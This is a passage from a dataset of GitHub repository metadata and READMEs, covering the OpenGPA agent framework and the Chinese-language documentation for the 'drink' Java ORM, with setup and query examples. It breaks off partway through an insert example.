'link']",0,55.0,4.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,3.0,1.0,1121,14.25,4.953216374269005,"['Jupyter -> http://jupyter.org/', 'DFLib.org -> https://dflib.org', 'IJava kernel -> https://github.com/SpencerPark/IJava', 'documentation -> https://dflib.org/jjava/docs/1.x/#_installation', 'releases tab -> https://github.com/dflib/jjava/releases', 'Website -> https://dflib.org/', 'Documentation -> https://dflib.org/jjava/docs/1.x/', 'Discussions and Support Forum -> https://github.com/dflib/jjava/discussions', 'Bug reports and feature requests -> https://github.com/dflib/jjava/issues']",9
eschnou/OpenGPA,main,"# OpenGPA - (Open) Agentic is all you need 😁

[![Twitter Follow](https://img.shields.io/twitter/follow/opengpa?style=social)](https://twitter.com/opengpa) &ensp;
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

**OpenGPA** is an Open-source General Purpose Agent. A self-hosted solution boasting capabilities similar to
popular GPTs.

- Agentic system with multi-step-reasoning, chain-of-thought, ReAct, tool use etc
- Support for [all major LLMs](https://docs.spring.io/spring-ai/reference/api/chatmodel.html) such as LLama, Mistral, Anthropic, OpenAI, etc.
- Off-line first. You can run on your own box with a local LLM. Data won't leave the server. All the power of GPT without the data privacy nightmare.
- Extensible framework allows to plug your own actions, such as calling into internal services and APIs
- Simple UI exposing insight on the GPA internal reasoning and actions
- Built-in RAG to search internal document stores
- Free and open source, deploy anywhere, customize to your needs

<p align=""center"">
  <img src=""/assets/opengpa_ui.png"" width=""640"" />
</p>

## :pencil2: Design principles

OpenGPA is much more than a UI on top of a LLM. It implements an agentic workflow, where a LLM is used as the 
*brain* of an agent to reason through multiple steps of planning, reasoning, and tool use.  In particular, OpenGpa 
is using the [ReAct](https://arxiv.org/abs/2210.03629) approach to verbally reason on the next step, decide on the action to execute, 
and observe the outcome.

```
{
  ""reasoning"": ""The user wants to know the current weather in Liege, Belgium. 
                The best action to get this information is to perform a web search with 
                the query 'current weather in Liege, Belgium'. The result of this action 
                will then be used to respond to the user's request. 
                This is not the final action as we have to get the results from the web 
                search first.""
  ""action"": {
    ""name"": ""webSearch"",
    ""arguments"": {
      ""query"": ""current weather in Liege, Belgium""
    }
  },
  ""is_final"": false
}
```

Action selection is based on a catalog of action that can easily be extended through code. You could add an action
to tap into an internal service to fetch some data, or a workflow engine to trigger a next step, etc.

## 🛠️️ Key Features

The current version is a minimal POC yet, it already packs a few interesting pieces:
- Works with all LLM supported by [spring-ai](https://spring.io/projects/spring-ai), including running **LLama** locally
- Multi-step task processing with **chain-of-thought** approach
- Action model with easy to extend **actions** for use by the agent
- Upload of **artifacts** to process by the agent
- Download of **artifacts** generated by the agent
- Import documents in knowledge base to support RAG search

## 🚧 Roadmap

Improve the Agentic capabilities:
- ✅ **RAG** enabling the agent to consult vast volume of internal documents
- **Memory** enabling the agent to remember key facts and use them later
- **code generation** and **execution** within the agent (using Groovy scripts?)
- **remote API invocation** to tap into existing enterprise APIs
- **web interactions** allowing the agent to navigate pages submit forms
- **scheduled** jobs for automating workflow
- **triggers** to create complete end-to-end workflows

Make OpenGPA enterprise ready:
- Persistence of tasks/steps
- Proper file storage and management
- User management and access control
- Secure API access through API gateway
- Auditing of task processing costs (token usage)
- Instrumentation and observability

## 🚀 Getting started

### Build and run the server

If you are on a Mac, the following should be enough to get you started and running this
locally. In case of trouble, please reach out on [Discord](https://discord.gg/3XPsmCRNE2). 

> [!WARNING]
> Building requires __Java 21__. If you are on a Mac, you can easily install it
> with `brew install openjdk@21`

By default, opengpa is using OpenAI gpt-4o as its LLM. Check the `application.properties` file 
for configuration options and the spring-ai documentation to configure support for other LLMs.

```bash
mvn clean package -Pproduction
OPENAI_API_KEY=sk-*** java -jar opengpa-server/target/opengpa-server-0.2.0.jar
```

Open the UI on [http://localhost:8000](http://localhost:8000) and login with username `opengpa` and password `opengpa`.


### Debugging

For debugging purposes you can log all interactions and prompts using the following config:
```
opengpa.server.log-prompt=true
opengpa.server.log-folder=/tmp/opengpa/logs
```

# Documentation
- [Setting up an OpengGPA server](documentation/setup.md)
- [Using local open-source LLM](documentation/offline.md)
- [Creating a custom Action](documentation/actions.md)

# Support
- Join us on [Discord](https://discord.gg/3XPsmCRNE2)
- Reach out on [X](https://x.com/opengpa)
- File an [issue](https://github.com/eschnou/OpenGPA/issues) 

# License

MIT License

Copyright (c) 2024 Laurent Eschenauer

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
",2,2,4,mit,1.0,"['opengpa', 'open', 'agentic', 'need', 'opengpa', 'general', 'purpose', 'agent', 'solution', 'boasting', 'capability', 'similar', 'popular', 'gpts', 'agentic', 'system', 'react', 'tool', 'use', 'etc', 'support', 'major', 'llm', 'llama', 'mistral', 'anthropic', 'openai', 'etc', 'first', 'run', 'box', 'local', 'llm', 'data', 'wo', 'leave', 'server', 'power', 'gpt', 'without', 'data', 'privacy', 'nightmare', 'extensible', 'framework', 'allows', 'plug', 'action', 'calling', 'internal', 'service', 'apis', 'simple', 'ui', 'exposing', 'insight', 'gpa', 'internal', 'reasoning', 'action', 'rag', 'search', 'internal', 'document', 'store', 'free', 'open', 'source', 'deploy', 'anywhere', 'customize', 'need', 'design', 'principle', 'opengpa', 'much', 'ui', 'top', 'llm', 'implement', 'agentic', 'workflow', 'llm', 'used', 'brain', 'agent', 'reason', 'multiple', 'step', 'planning', 'reasoning', 'tool', 'use', 'particular', 'opengpa', 'using', 'react', 'approach', 'verbally', 'reason', 'next', 'step', 'decide', 'action', 'execute', 'observe', 'outcome', 'action', 'selection', 'based', 'catalog', 'action', 'easily', 'extended', 'code', 'could', 'add', 'action', 'tap', 'internal', 'service', 'fetch', 'data', 'workflow', 'engine', 'trigger', 'next', 'step', 'etc', 'key', 'feature', 'current', 'version', 'minimal', 'poc', 'yet', 'already', 'pack', 'interesting', 'piece', 'work', 'llm', 'supported', 'including', 'running', 'llama', 'locally', 'task', 'processing', 'approach', 'action', 'model', 'easy', 'extend', 'action', 'use', 'agent', 'upload', 'artifact', 'process', 'agent', 'download', 'artifact', 'generated', 'agent', 'import', 'document', 'knowledge', 'base', 'support', 'rag', 'search', 'roadmap', 'improve', 'agentic', 'capability', 'rag', 'enabling', 'agent', 'consult', 'vast', 'volume', 'internal', 'document', 'memory', 'enabling', 'agent', 'remember', 'key', 'fact', 'use', 'later', 'code', 'generation', 'execution', 'within', 'agent', 'using', 'groovy', 'script', 'remote', 'api', 'invocation', 'tap', 'existing', 'enterprise', 'apis', 'web', 'interaction', 'allowing', 'agent', 'navigate', 'page', 'submit', 'form', 'scheduled', 'job', 'automating', 'workflow', 'trigger', 'create', 'complete', 'workflow', 'make', 'opengpa', 'enterprise', 'ready', 'persistence', 'proper', 'file', 'storage', 'management', 'user', 'management', 'access', 'control', 'secure', 'api', 'access', 'api', 'gateway', 'auditing', 'task', 'processing', 'cost', 'token', 'usage', 'instrumentation', 'observability', 'getting', 'started', 'build', 'run', 'server', 'mac', 'following', 'enough', 'get', 'started', 'running', 'locally', 'case', 'trouble', 'please', 'reach', 'discord', 'warning', 'building', 'requires', 'java', 'mac', 'easily', 'install', 'default', 'opengpa', 'using', 'openai', 'llm', 'check', 'file', 'configuration', 'option', 'documentation', 'configure', 'support', 'llm', 'open', 'ui', 'http', 'login', 'username', 'password', 'debugging', 'debugging', 'purpose', 'log', 'interaction', 'prompt', 'using', 'following', 'config', 'documentation', 'setting', 'openggpa', 'server', 'using', 'local', 'llm', 'creating', 'custom', 'action', 'support', 'join', 'u', 'discord', 'reach', 'x', 'file', 'issue', 'license', 'mit', 'license', 'copyright', 'c', 'laurent', 'eschenauer', 'permission', 'hereby', 'granted', 'free', 'charge', 'person', 'obtaining', 'copy', 'software', 'associated', 'documentation', 'file', 'software', 'deal', 'software', 'without', 'restriction', 'including', 'without', 'limitation', 'right', 'use', 'copy', 'modify', 'merge', 'publish', 'distribute', 'sublicense', 'sell', 'copy', 'software', 'permit', 'person', 'software', 'furnished', 'subject', 'following', 'condition', 'copyright', 'notice', 'permission', 'notice', 'shall', 'included', 'copy', 'substantial', 'portion', 'software', 'software', 'provided', 'without', 'warranty', 'kind', 'express', 'implied', 'including', 'limited', 'warranty', 'merchantability', 'fitness', 'particular', 'purpose', 'noninfringement', 'event', 'shall', 'author', 'copyright', 'holder', 'liable', 'claim', 'damage', 'liability', 'whether', 'action', 'contract', 'tort', 'otherwise', 'arising', 'connection', 'software', 'use', 'dealing', 'software']","['action', 'agent', 'software', 'llm', 'opengpa']",0,0,0,"['opengpa', 'open', 'agentic', 'need', 'design', 'principle', 'key', 'feature', 'roadmap', 'getting', 'start', 'build', 'run', 'server', 'debug', 'documentation', 'support', 'license']",10,"['opengpa', 'open', 'agentic', 'need', 'design']",3,59.0,6.0,"[com.vaadin:vaadin-maven-plugin,maven-compiler-plugin,maven-shade-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,5.0,1.0,6103,33.17857142857143,4.934337997847147,"['![Twitter Follow -> https://img.shields.io/twitter/follow/opengpa?style=social', '![License: MIT -> https://img.shields.io/badge/License-MIT-yellow.svg', 'all major LLMs -> https://docs.spring.io/spring-ai/reference/api/chatmodel.html', 'ReAct -> https://arxiv.org/abs/2210.03629', 'spring-ai -> https://spring.io/projects/spring-ai', 'Discord -> https://discord.gg/3XPsmCRNE2', 'http://localhost:8000 -> http://localhost:8000', 'Discord -> https://discord.gg/3XPsmCRNE2', 'X -> https://x.com/opengpa', 'issue -> https://github.com/eschnou/OpenGPA/issues']",10
kiryu1223/drink,master,"qq群：257911716

**最新最热版本:**![Maven Central Version](https://img.shields.io/maven-central/v/io.github.kiryu1223/drink-all)

## 如何引入

### 从零开始构建的场合

1. 引入maven并且进行配置

   ```xml
   <dependencies>
           <!--需要引入的依赖-->
           <dependency>
               <groupId>io.github.kiryu1223</groupId>
               <artifactId>drink-core</artifactId>
               <version>${project.version}</version>
           </dependency>

           <!--需要用户自己提供一个日志实现-->
           <dependency>
               <groupId>ch.qos.logback</groupId>
               <artifactId>logback-classic</artifactId>
               <version>1.2.12</version>
           </dependency>

           <!--数据库-->
           <dependency>
               <groupId>com.mysql</groupId>
               <artifactId>mysql-connector-j</artifactId>
               <version>9.0.0</version>
           </dependency>

           <!--数据源-->
           <dependency>
               <groupId>com.zaxxer</groupId>
               <artifactId>HikariCP</artifactId>
               <version>4.0.3</version>
           </dependency>
   
            <dependency>
                <groupId>org.projectlombok</groupId>
                <artifactId>lombok</artifactId>
                <version>1.18.34</version>
            </dependency>
   
       </dependencies>

       <build>
           <plugins>
               <plugin>
                   <groupId>org.apache.maven.plugins</groupId>
                   <artifactId>maven-compiler-plugin</artifactId>
                   <version>3.8.1</version>
                   <configuration>
                       <!--开启框架的指令-->
                       <compilerArgs>
                           <arg>-Xplugin:ExpressionTree</arg>
                       </compilerArgs>
                       <annotationProcessorPaths>
                           <!--路径配置-->
                           <path>
                               <groupId>io.github.kiryu1223</groupId>
                               <artifactId>drink-core</artifactId>
                               <version>${project.version}</version>
                           </path>
                           <!--你的剩余路径配置，假设你的项目中还依赖了lombok的话-->
                           <path>
                               <groupId>org.projectlombok</groupId>
                               <artifactId>lombok</artifactId>
                               <version>1.18.34</version>
                           </path>
                       </annotationProcessorPaths>
                   </configuration>
               </plugin>
           </plugins>
       </build>
   ```
2. 配置完成后进入main

   ```java
   package io.github.kiryu1223;

   import com.zaxxer.hikari.HikariDataSource;
   import io.github.kiryu1223.drink.core.Drink;
   import io.github.kiryu1223.drink.core.api.client.DrinkClient;
   import io.github.kiryu1223.drink.transaction.DefaultTransactionManager;
   import io.github.kiryu1223.drink.transaction.TransactionManager;
   import io.github.kiryu1223.drink.core.core.dataSource.DataSourceManager;
   import io.github.kiryu1223.drink.core.core.dataSource.DefaultDataSourceManager;
   import io.github.kiryu1223.drink.core.core.session.DefaultSqlSessionFactory;
   import io.github.kiryu1223.drink.core.core.session.SqlSessionFactory;

   public class Main
   {
       public static void main(String[] args)
       {
           // 配置一个数据源
           HikariDataSource dataSource = new HikariDataSource();
           dataSource.setJdbcUrl(""jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true"");
           dataSource.setUsername(""root"");
           dataSource.setPassword(""root"");
           dataSource.setDriverClassName(""com.mysql.cj.jdbc.Driver"");

           // 获取一个DrinkClient对象，所有的CRUD都通过他完成
           DataSourceManager dataSourceManager = new DefaultDataSourceManager(dataSource);
           TransactionManager transactionManager = new DefaultTransactionManager(dataSourceManager);
           SqlSessionFactory sqlSessionFactory = new DefaultSqlSessionFactory(dataSourceManager, transactionManager);

           Option option = new Option();
           option.setPrintSql(true);

           DrinkClient client = Drink.bootStrap()
                   .setDbType(DbType.MySQL)
                   .setOption(option)
                   .setDataSourceManager(dataSourceManager)
                   .setTransactionManager(transactionManager)
                   .setSqlSessionFactory(sqlSessionFactory)
                   .build();
       }
   }
   ```

3. 启动！

### 使用SpringBoot

1. 引入starter并且填上开启的指令

   ```xml
           <dependency>
               <groupId>io.github.kiryu1223</groupId>
               <artifactId>drink-spring-boot-starter</artifactId>
               <version>${project.version}</version>
           </dependency>
   ```
   
   ```xml
      <build>
         <plugins>
             <plugin>
                 <groupId>org.apache.maven.plugins</groupId>
                 <artifactId>maven-compiler-plugin</artifactId>
                 <version>3.8.1</version>
                 <configuration>
                     <compilerArgs>
                         <arg>-Xplugin:ExpressionTree</arg>
                     </compilerArgs>
                     <annotationProcessorPaths>
                         <path>
                             <groupId>io.github.kiryu1223</groupId>
                             <artifactId>drink-core</artifactId>
                             <version>${project.version}</version>
                         </path>
                     </annotationProcessorPaths>
                 </configuration>
             </plugin>
         </plugins>
     </build>
   ```
2. 配置yml
   ```yaml
   spring:
     output:
       ansi:
         enabled: always
     profiles:
       active: dev
     # 最低程度配置下只需要提供一个数据源
     dsName:
       type: com.zaxxer.hikari.HikariDataSource
       url: jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true
       username: root
       password: root
       driverClassName: com.mysql.cj.jdbc.Driver

   server:
     port: 8080

   # 不配置的情况下默认以database: mysql和print-sql: true模式运行
   #drink:
   #  database: mysql
   #  print-sql: true
   ```

3. 启动！

### 使用Solon

1. 引入插件并且填上开启的指令

   ```xml
           <dependency>
               <groupId>io.github.kiryu1223</groupId>
               <artifactId>drink-solon-plugin</artifactId>
               <version>${project.version}</version>
           </dependency>
   ```
   ```xml
      <build>
         <plugins>
             <plugin>
                 <groupId>org.apache.maven.plugins</groupId>
                 <artifactId>maven-compiler-plugin</artifactId>
                 <version>3.8.1</version>
                 <configuration>
                     <compilerArgs>
                         <arg>-Xplugin:ExpressionTree</arg>
                     </compilerArgs>
                     <annotationProcessorPaths>
                         <path>
                             <groupId>io.github.kiryu1223</groupId>
                             <artifactId>drink-core</artifactId>
                             <version>${project.version}</version>
                         </path>
                     </annotationProcessorPaths>
                 </configuration>
             </plugin>
         </plugins>
     </build>
   ```
2. 配置config和yml

   ```yml
   # 这个名称与config类中的@Inject(""${ds1}"")对应
   ds1:
     type: com.zaxxer.hikari.HikariDataSource
     jdbcUrl: jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true
     driverClassName: com.mysql.cj.jdbc.Driver
     username: root
     password: root
   # 这个名称与config类中的@Inject(""${ds2}"")对应
   ds2:
     type: com.zaxxer.hikari.HikariDataSource
     jdbcUrl: jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true
     driverClassName: com.mysql.cj.jdbc.Driver
     username: root
     password: root
   # 这个名称与config类中的@Inject(""${ds3}"")对应
   ds3:
     type: com.zaxxer.hikari.HikariDataSource
     jdbcUrl: jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true
     driverClassName: com.mysql.cj.jdbc.Driver
     username: root
     password: root

   # 这个名称与config类中的@Inject(""${dynamic}"")对应
   # 多数据源
   dynamic:
     type: com.zaxxer.hikari.HikariDataSource
     strict: true #严格模式（指定的源不存时：严格模式会抛异常；非严格模式用默认源）
     default: db_user_1 #指定默认数据源
     db_user_1:
       schema: db_user
       jdbcUrl: jdbc:mysql://localhost:3306/db_user?useUnicode=true&characterEncoding=utf8&autoReconnect=true&rewriteBatchedStatements=true
       driverClassName: com.mysql.cj.jdbc.Driver
       username: root
       password: 123456
     db_user_2:
       schema: db_user
       jdbcUrl: jdbc:mysql://localhost:3307/db_user?useUnicode=true&characterEncoding=utf8&autoReconnect=true&rewriteBatchedStatements=true
       driverClassName: com.mysql.cj.jdbc.Driver
       username: root
       password: 123456

   drink:
     # 这个名称代表了ioc容器中Client对象bean的别名，通过@Inject(""main"")注入到你想要的地方，下同
     main:
       database: MySQL
       # 这里需要一个config类中定义的的数据源的bean的别名，下同
       dsName: normalDs1
     sub:
       database: SqlServer
       dsName: normalDs2
     readonly:
       database: H2
       dsName: normalDs3
     dynamic:
       database: H2
       dsName: dynamicDs
   ```

   ```java
   package io.github.kiryu1223.app.config;

   import com.zaxxer.hikari.HikariDataSource;
   import org.noear.solon.annotation.Bean;
   import org.noear.solon.annotation.Configuration;
   import org.noear.solon.annotation.Inject;
   import org.noear.solon.data.dynamicds.DynamicDataSource;

   import javax.sql.DataSource;

   @Configuration
   public class MyConfig
   {
       @Bean(""normalDs1"")
       public DataSource dataSource1(@Inject(""${ds1}"") HikariDataSource dataSource)
       {
           return dataSource;
       }

       @Bean(""normalDs2"")
       public DataSource dataSource2(@Inject(""${ds2}"") HikariDataSource dataSource)
       {
           return dataSource;
       }

       @Bean(""normalDs3"")
       public DataSource dataSource3(@Inject(""${ds3}"") HikariDataSource dataSource)
       {
           return dataSource;
       }

       @Bean(""dynamicDs"")
       public DataSource dataSource4(@Inject(""${dynamic}"") DynamicDataSource dataSource)
       {
           return dataSource;
       }
   }
   ```

   注意，在只配了一个client对象的情况下，使用`@inject`注解在service或者你想要的地方注入Client对象时，不需要填入别名（否则会找不到报错）

3. 启动！

## 数据库支持

+ h2
+ mysql
+ oracle
+ sqlserver
+ sqlite
+ pgsql
+ ...

## 常用的注解

`Table`：用于表示表名的注解

| 字段     | 类型     | 默认值 | 说明               |
|--------|--------|-----|------------------|
| schema | String | 无   | 表的所属,为空时表示为默认的所属 |
| value  | String | 无   | 表名，为空时表示类名等于表名   |

`Column`：用于表示列名的注解

| 字段         | 类型                                  | 默认值               | 说明                                            |
|------------|-------------------------------------|-------------------|-----------------------------------------------|
| primaryKey | boolean                             | false             | 是否为主键                                         |
| value      | String                              | 无                 | 字段对应的列名，为空时等于字段名                              |
| converter  | Class\<? extends IConverter\<?, ?>> | NoConverter.class | 转换器，用于列类型与java类型不一致的情况（比如数据库枚举<=>java枚举）,默认为无 |

`Navigate`：用于表示关联关系的注解

| 字段            | 类型                             | 默认值                 | 说明                                      |
|---------------|--------------------------------|---------------------|-----------------------------------------|
| value         | RelationType                   | 无                   | 用于表示当前类与目标类的关联关系，有四种关系（一对一，一对多，多对一，多对多） |
| self          | String                         | 无                   | 自身类的关联关系的java字段名                        |
| target        | String                         | 无                   | 目标类的关联关系的java字段名                        |
| mappingTable  | Class<? extends IMappingTable> | IMappingTable.class | 多对多下必填,中间表，需要继承IMappingTable            |
| selfMapping   | String                         | 无                   | 多对多下必填,自身类对应的mappingTable表java字段名       |
| targetMapping | String                         | 无                   | 多对多下必填,目标类对应的mappingTable表java字段名       |

`IgnoreColumn`：用于表示字段与表无关的注解

## CRUD

所有的增删查改操作都由DrinkClient对象完成（以下简称为client）

以下是主要使用的api

| 方法     | 参数             | 返回     |
|--------|----------------|--------|
| query  | 数据库表对应对象的class | 查询过程对象 |
| insert | 一个或者多个相同的表对应对象 | 新增过程对象 |
| update | 数据库表对应对象的class | 更新过程对象 |
| delete | 数据库表对应对象的class | 删除过程对象 |

### 查询

查询由client对象的query方法发起，query方法接收一个class对象，返回一个查询过程对象，
可以在后续调用`where` `group by` `limit`等方法添加查询条件

以下是常用的查询过程的api

| 方法          | 参数                                            | 返回                        | 说明                                                                                                                                                                            |
|-------------|-----------------------------------------------|---------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `leftJoin`  | 参数1：class对象或者LQuery对象<br/> 参数2：连接条件的lambda表达式 | 当前泛型数量+1的查询过程对象（因为连了一张新表） | 左连接                                                                                                                                                                           |
| `rightJoin` | 同leftJoin                                     | 同leftJoin                 | 右连接                                                                                                                                                                           |
| `innerJoin` | 同leftJoin                                     | 同leftJoin                 | 内连接                                                                                                                                                                           |
| `where`     | where条件的lambda表达式                             | this                      | where过滤条件，多个where默认使用and拼接                                                                                                                                                    |
| `orWhere`   | 同where                                        | this                      | 同where，区别是多个where使用or拼接                                                                                                                                                       |
| `groupBy`   | 返回单个元素或者包含多个元素的Grouper对象的lambda               | 组查询过程对象                   | 单个元素的group by时，可以直接类似于<br/>`a -> a.getId()`<br/>这样的lambda,多个元素时需要使用 <br/>a -> new Grouper()<br/>{ <br/>int id=a.getId();<br/>String name=a.getName();<br/>...<br/>} 这样的lambda |
| `having`    | having条件的lambda表达式                            | this                      | having过滤条件，多个having使用and连接                                                                                                                                                    |
| `orderBy`   | 参数1：需要排序的一个字段<br/>参数2：是否反向排序                  | this                      | 默认正序排序，有多个排序字段的需求时需要调用次orderBy方法                                                                                                                                              |
| `limit`     | rows或者offset和rows                             | this                      |                                                                                                                                                                               |
| `distinct`  | 无参或bool                                       | this                      | 无参调用时将distinct设置为true                                                                                                                                                         |
| `select `   | 无参select()或select(Vo.class)或select(lambda)    | 新查询过程对象                   | select代表一次查询过程的终结，在select之后调用任意条件api（例如where）都将把上一个查询过程视为中间表然后对中间表进行的查询                                                                                                       |
| `endSelect` | 需要返回的字段与返回类型                                  | 终结查询过程对象                  | 同select,区别是当需要返回单一的元素时（比如说`select(s -> s.getId())`），出于安全考虑强制要求使用endSelect（`endSelect(s -> s.getId())`）而非select                                                                |
| `toList`    |                                               | 查询返回的结果集                  | 多表查询时必须进行一次select之后才能进行返回结果集操作（因为多表情况下不知道到底要返回什么）                                                                                                                             |

假设我们有一个员工表

```java

@Data
@Table(""employees"")
public class Employee
{
    //员工id
    @Column(""emp_no"")
    private int number;
    //生日
    @Column(""birth_date"")
    private LocalDate birthDay;
    @Column(""first_name"")
    private String firstName;
    @Column(""last_name"")
    private String lastName;
    //性别
    @Column(converter = GenderConverter.class)
    private Gender gender;
    //入职日期
    @Column(""hire_date"")
    private LocalDate hireDay;
}
```

根据id获得员工对象

```java
public class DisplayTest extends BaseTest
{
    public void d1()
    {
        int id = 10001;
        List<Employee> list = client.query(Employee.class) // FROM `employees` AS t0
                .where(e -> e.getNumber() == id) // WHERE t0.`emp_no` = ?
                // 因为没有select，默认选择了全字段 
                // SELECT t0.`birth_date`,t0.`first_name`,t0.`last_name`,t0.`emp_no`,t0.`hire_date`,t0.`gender`
                .toList();
    }
}
```

对应的sql

```mysql
SELECT t0.`birth_date`, t0.`first_name`, t0.`last_name`, t0.`emp_no`, t0.`hire_date`, t0.`gender`
FROM `employees` AS t0
WHERE t0.`emp_no` = ?
```

根据firstName和性别获得员工对象

```java
public class DisplayTest extends BaseTest
{
    public void d2()
    {
        List<Employee> list = client.query(Employee.class) // FROM `employees` AS t0
                .where(e -> e.getGender() == Gender.F && e.getFirstName() == ""lady"") // WHERE t0.`gender` = ? AND t0.`first_name` = ?
                // 因为没有select，默认选择了全字段 
                // SELECT t0.`birth_date`, t0.`first_name`, t0.`last_name`, t0.`emp_no`, t0.`hire_date`, t0.`gender`
                .toList();
    }
}
```

对应的sql

```mysql
SELECT t0.`birth_date`, t0.`first_name`, t0.`last_name`, t0.`emp_no`, t0.`hire_date`, t0.`gender`
FROM `employees` AS t0
WHERE t0.`gender` = ?
  AND t0.`first_name` = ?
```

假设我们还有一张员工薪资历史表

```java

@Data
@Table(""salaries"")
public class Salary
{
    //员工id
    @Column(""emp_no"")
    private int empNumber;
    //薪资
    private int salary;
    //何时开始的
    @Column(""from_date"")
    private LocalDate from;
    //何时为止的
    @Column(""to_date"")
    private LocalDate to;
}
```

查询一个员工的姓名和历史最高薪资和平均薪资

```java
public class DisplayTest extends BaseTest
{
    public void d3()
    {
        int id = 10001;
        List<? extends Result> list = client.query(Employee.class) // FROM `employees` AS t0
                .leftJoin(Salary.class, (e, s) -> e.getNumber() == s.getEmpNumber()) // LEFT JOIN `salaries` AS t1 ON t0.`emp_no` = t1.`emp_no`
                .where((e, s) -> e.getNumber() == id) // WHERE t0.`emp_no` = ?
                // SELECT
                .select((e, s) -> new Result()
                {
                    // CONCAT(t0.`first_name`, ?, t0.`last_name`) AS `name` 
                    String name = SqlFunctions.concat(e.getFirstName(), "" "", e.getLastName());
                    // MAX(t1.`salary`)                           AS `maxSalary`,
                    int maxSalary = SqlFunctions.max(s.getSalary());
                    // AVG(t1.`salary`)                           AS `avgSalary`
                    BigDecimal avgSalary = SqlFunctions.avg(s.getSalary());
                })
                .toList();
    }
}
```

对应的sql

```mysql
SELECT CONCAT(t0.`first_name`, ?, t0.`last_name`) AS `name`,
       MAX(t1.`salary`)                           AS `maxSalary`,
       AVG(t1.`salary`)                           AS `avgSalary`
FROM `employees` AS t0
         LEFT JOIN `salaries` AS t1 ON t0.`emp_no` = t1.`emp_no`
WHERE t0.`emp_no` = ?
```

假设我们还有部门表和员工部门中间表

```java

@Table(""departments"")
@Data
public class Department
{
    // 部门编号
    @Column(""dept_no"")
    private String number;
    // 部门名称
    @Column(""dept_name"")
    private String name;
}
```

```java

@Data
@Table(""dept_emp"")
public class DeptEmp
{
    // 员工编号
    @Column(""emp_no"")
    private int empNumber;
    // 部门编号
    @Column(""dept_no"")
    private String deptNumber;
    // 什么时候加入的
    @Column(""from_date"")
    private LocalDate from;
    // 什么时候离开的
    @Column(""to_date"")
    private LocalDate to;
}
```

查询某部门的员工的平均薪水

```java
public class DisplayTest extends BaseTest
{
    public void d4()
    {
        String departmentId = ""d009"";

        List<? extends Result> list = client.query(DeptEmp.class) // FROM `dept_emp` AS t0
                .innerJoin(Salary.class, (de, s) -> de.getEmpNumber() == s.getEmpNumber()) // INNER JOIN `salaries` AS t1 ON t0.`emp_no` = t1.`emp_no`
                .innerJoin(Department.class, (de, s, d) -> de.getDeptNumber() == d.getNumber()) // INNER JOIN `departments` AS t2 ON t0.`dept_no` = t2.`dept_no`
                .where((de, s, d) -> de.getDeptNumber() == departmentId && s.getTo() == LocalDate.of(9999, 1, 1)) // WHERE t0.`dept_no` = ? AND t1.`to_date` = ?
                // GROUP BY 
                .groupBy((de, s, d) -> new Grouper()
                {
                    // t0.`dept_no`, 
                    String id = de.getDeptNumber();
                    // t2.`dept_name`
                    String name = d.getName();
                })
                // SELECT
                .select(g -> new Result()
                {
                    // t0.`dept_no` AS `deptId`
                    String deptId = g.key.id;
                    // t2.`dept_name` AS `deptName`
                    String deptName = g.key.name;
                    // AVG(t1.`salary`) AS `avgSalary`
                    BigDecimal avgSalary = g.avg((de, s, d) -> s.getSalary());
                })
                .toList();
    }
}
```

对应的sql

```mysql
SELECT t0.`dept_no` AS `deptId`, t2.`dept_name` AS `deptName`, AVG(t1.`salary`) AS `avgSalary`
FROM `dept_emp` AS t0
         INNER JOIN `salaries` AS t1 ON t0.`emp_no` = t1.`emp_no`
         INNER JOIN `departments` AS t2 ON t0.`dept_no` = t2.`dept_no`
WHERE t0.`dept_no` = ?
  AND t1.`to_date` = ?
GROUP BY t0.`dept_no`, t2.`dept_name`
```

### 新增

新增由client对象的insert方法发起，insert方法接收一个或多个数据库表对应的对象，
返回一个新增过程对象,可以对这个新增过程对象后续进行insert方法添加更多数据

| 方法          | 参数           | 返回      | 说明             |
|-------------|--------------|---------|----------------|
| insert      | 同类型单个对象或对象集合 | this    | 添加更多需要传入数据库的对象 |
| executeRows |              | 执行成功的数量 | 执行insert       |

> 注意：insert根据数量自动选择批量执行（数量>=2）

Department表新增一个数据

```java
public class DisplayTest extends BaseTest
{
    public void i1()
    {
        Department department = new Department();
        department.setNumber(""101"");
        department.setName(""ddd"");

        client.insert(department).executeRows();
    }
}
```

新增多个数据

```java
public class DisplayTest extends BaseTest
{
    public void i2()
    {
        Department department1 = new Department();
        department1.setNumber(""101"");
        department1.setName(""ddd"");
        Department department2 = new Department();
        department2.setNumber(""102"");
        department2.setName(""eee"");
        Department department3 = new Department();
